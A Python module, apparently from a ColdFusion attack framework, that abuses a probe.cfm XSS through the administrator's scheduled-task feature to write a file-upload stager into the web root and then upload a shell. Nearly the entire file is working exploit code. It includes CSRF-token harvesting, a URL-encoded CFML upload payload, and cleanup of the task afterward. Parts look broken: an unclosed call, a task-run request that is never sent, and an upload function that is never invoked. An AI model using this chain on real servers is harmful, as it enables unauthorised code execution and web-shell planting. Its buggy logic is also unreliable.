"""
this uses the probe.cfm XSS to create an upload stager, then uploads a shell.
"""
from src.platform.coldfusion.interfaces import CINTERFACES
from src.platform.coldfusion.authenticate import checkAuth
from src.module.deploy_utils import _serve, waitServe, parse_war_path # some of this may not be needed...
from os.path import abspath
from log import LOG
from threading import Thread
from re import findall
from time import sleep
import utility


title = CINTERFACES.CFM
versions = ['9.0'] # needs testing for older versions
def deploy(fingerengine, fingerprint):
    """
    """

    cfm_path = abspath(fingerengine.options.deploy)
    cfm_file = parse_war_path(cfm_path, True)
    dip = fingerengine.options.ip

    utility.Msg("Preparing to deploy {0}...".format(cfm_file))
    utility.Msg("Fetching web root...", LOG.DEBUG)

    # fetch web root; this is where we stash the file
    root = fetch_webroot(dip, fingerprint)
    if not root:
        utility.Msg("Unable to fetch web root.", LOG.ERROR)
        return

    # create the scheduled task
    utility.Msg("Web root found at %s" % root, LOG.DEBUG)
    utility.Msg("Creating scheduled task...")

    if not create_task(dip, fingerprint, cfm_file, root):
        return 

    # invoke the task
    utility.Msg("Task %s created, invoking task..." % cfm_file)
    run_task(dip, fingerprint, cfm_path)

    # remove the task
    utility.Msg("Cleaning up...")
    delete_task(dip, fingerprint, cfm_file)


def create_task(ip, fingerprint, cfm_file, root):
    """ Create the task
    """

    url = "http://{0}:{1}/CFIDE/administrator/scheduler/scheduleedit.cfm".\
                                                    format(ip, fingerprint.port)
    upload_stager_xss = "/CFIDE/probe.cfm?name=%3Cb%3E%26%23181%3BSH%3C%2Fb%3E%22%3C%2Fh1%3E%3Ccfif%20isDefined(%22Form.File%22)%3E%3Ccftry%3E%3Ccffile%20action%3D%22upload%22%20destination%3D%22%23Expandpath(%22.%22)%23%22%20filefield%3D%22Form.File%22%20nameconflict%3D%22overwrite%22%3EY!%3Ccfcatch%3EN!%3C%2Fcfcatch%3E%3C%2Fcftry%3E%3C%2Fcfif%3E%3Cform%20method%3DPOST%20enctype%3D%22multipart%2Fform-data%22%3E%3Cinput%20type%3Dfile%20name%3D%22File%22%3E%3Cinput%20type%3Dsubmit%20value%3D%22Upload%22%3E%3C%2Fform%3E%3Cscript%3E"

    (cookie, csrf) = fetch_csrf(ip, fingerprint, url)
    data = {
            "csrftoken" : csrf,
            "TaskName" : cfm_file,
            "Start_Date" : "Jan 27, 2014", # shouldnt matter since we force run
            "ScheduleType" : "Once",
            "StartTimeOnce" : "9:56 PM", # see above
            "Operation" : "HTTPRequest",
            "ScheduledURL" : "http://{0}:{1}/{2}".format(ip, fingerprint.port, upload_stager_xss),
            "publish" : "1",
            "publish_file" : root + "\\" + cfm_file, # slash on OS?
            "adminsubmit" : "Submit"
           }

    response = utility.requests_get(url, cookies=cookie)
    if response.status_code is 200:

        # create task
        response = utility.requests_post(url, data=data, cookies=cookie,
                        headers={'Content-Type':'application/x-www-form-urlencoded'})
        if response.status_code is 200:
            return True


def delete_task(ip, fingerprint, cfm_file):
    """ Once we run the task and pop our shell, we need to remove the task
    """

    url = "http://{0}:{1}/CFIDE/administrator/scheduler/scheduletasks.cfm".\
                                                format(ip, fingerprint.port)
    uri = "?action=delete&task={0}&csrftoken={1}"

    (cookie, csrf) = fetch_csrf(ip, fingerprint, url)
    response = utility.requests_get(url + uri.format(cfm_file, csrf), cookies=cookie)
    if not response.status_code is 200:
        utility.Msg("Failed to remove task.  May require manual removal.", LOG.ERROR)


def run_task(ip, fingerprint, cfm_path):
    """ Invoke the task and wait for the remote server to fetch
    our file
    """

    cfm_name = parse_war_path(cfm_path, True)


    url = "http://{0}:{1}/CFIDE/administrator/scheduler/scheduletasks.cfm"\
                                                  .format(ip, fingerprint.port)

    (cookie, csrf) = fetch_csrf(ip, fingerprint, url)
    
    uri = "?runtask={0}&timeout=0&csrftoken={1}".format(cfm_name, csrf)

    response = utility.requests_get(url, cookies=cookie)
    utility.Msg("{0} deployed to /CFIDE/{0}".format(cfm_name)


def fetch_csrf(ip, fingerprint, url):
    """ Most of these requests use a CSRF; we can grab this so long as
    we send the request using the same session token.

    Returns a tuple of (cookie, csrftoken)
    """

    # lets try and fetch CSRF
    cookies = checkAuth(ip, fingerprint.port, title, fingerprint.version)
    if cookies:
        response = utility.requests_get(url, cookies=cookies[0])
    else:
        utility.Msg("Could not get auth for %s:%s" % (ip, fingerprint.port), LOG.ERROR)
        return False

    if response.status_code is 200:

        token = findall("name=\"csrftoken\" value=\"(.*?)\">", response.content)
        if len(token) > 0:
            return (cookies[0], token[0])
        else:
            utility.Msg("CSRF appears to be disabled.")
            return (cookies[0], None)


def fetch_webroot(ip, fingerprint):
    """ Pick out the web root from the settings summary page 
    """

    url = "http://{0}:{1}/CFIDE/administrator/reports/index.cfm"\
                                        .format(ip, fingerprint.port)

    cookies = checkAuth(ip, fingerprint.port, title, fingerprint.version)
    if cookies:
        req = utility.requests_get(url, cookies=cookies[0])
    else:
        utility.Msg("Could not get auth for %s:%s" % (ip, fingerprint.port), LOG.ERROR)
        return False

    if req.status_code is 200:

        data = findall("CFIDE &nbsp;</td><td scope=row class=\"cellRightAndBottomBlueSide\">(.*?)</td>",
                            req.content.translate(None, "\n\t\r"))

        if len(data) > 0:
            return data[0].replace("&#x5c;", "\\").replace("&#x3a;", ":")[:-7]
        else:
            return False
            
def up_shell(ip, fingerprint, cfm_name, cfm_file):
    """ Theres almost certainly something horribly wrong here
    """
    url = "http://{0}:{1}/CFIDE/{2}".format(ip, fingerprint.port, cfm_name) # our stager SHOULD be here yo
    req = utility.requests_post(url, files={'File': open(cfm_file,"rb")}) # no idea if this is right...
    if "uploaded!" in req.text:
        utility.Msg("Shell Uploaded! /CFIDE/fuse.cfm?!") # something like this yo
    else:
        utility.Msg("Something not right?")
        return False
